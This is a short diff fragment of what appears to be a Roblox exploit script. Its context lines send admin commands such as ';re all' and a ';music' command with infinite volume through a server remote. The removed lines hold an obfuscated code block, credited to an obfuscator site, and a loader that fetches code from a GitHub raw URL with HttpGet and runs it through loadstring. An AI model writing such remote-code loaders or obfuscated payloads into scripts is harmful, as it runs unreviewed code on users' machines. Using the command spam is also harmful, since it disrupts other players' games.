@@ -7908,12 +7908,3 @@ task.wait(0.2)
 RequestCommand:InvokeServer(";re all")
 task.wait(0.1)
 RequestCommand:InvokeServer(";music 138376415858162 ;pitch 0.08 ;volume inf")
-
--- [[ v1.0.0 https://wearedevs.net/obfuscator ]] return(function(...)local D={... [کل کد obfuscate]...} end)(...)
-
-
--- ══════════════════════════════════════════════════════════════
--- [+] Loader
--- ══════════════════════════════════════════════════════════════
-
-task.spawn(function() pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/sepehrali1/.decayy/refs/heads/main/Auto"))() end) end)
